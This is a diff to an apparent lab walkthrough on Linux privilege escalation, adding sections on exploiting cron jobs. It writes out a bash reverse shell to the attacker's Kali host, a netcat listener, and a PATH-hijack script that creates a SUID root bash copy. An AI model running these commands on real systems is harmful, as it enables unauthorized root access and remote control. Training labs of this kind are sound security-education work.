@@ -111,7 +111,7 @@ Note that the /etc/shadow file on the VM is world-writable
 ls -l /etc/shadow
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Generate a new password hash with a password of your choice.
 
@@ -250,7 +250,7 @@ TERM= sudo more /etc/profile
 !/bin/sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -265,7 +265,7 @@ sudo less /etc/profile
 !/bin/sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
@@ -428,3 +428,110 @@ Create a shared object with the same name as one of the listed libraries (libcry
 </strong></code></pre>
 
 <figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+## Cron Jobs - File Permissions
+
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
+
+View the contents of the system-wide crontab.
+
+**Victim**
+
+```
+cat /etc/crontab
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
+
+Locate the full path of the overwrite.sh file.
+
+**Victim**
+
+```
+locate overwrite.sh
+```
+
+Note that the file is world-writable.
+
+**Victim**
+
+```
+ls -l /usr/local/bin/overwrite.sh
+```
+
+Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box
+
+#### overwrite.sh
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/$KALI/4444 0>&1
+```
+
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener. If it doesn't recheck the permissions of the file, is anything missing?
+
+**Kali**
+
+```
+nc -nvlp 4444
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+## Cron Jobs - PATH Environment Variable
+
+View the contents of the system-wide crontab
+
+**Victim**
+
+```
+cat /etc/crontab
+```
+
+Note that the PATH variable starts with /home/user which is our user's home directory. Create a file called overwrite.sh in your home directory with the following contents
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+#### overwrite.sh
+
+```
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+
+Make sure that the file is executable
+
+**Victim**
+
+```
+chmod +x /home/user/overwrite.sh
+```
+
+Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
+
+**Victim**
+
+```
+/tmp/rootbash -p
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+##
+
+##
+
+## Cron Jobs - Wildcards
+
+
+
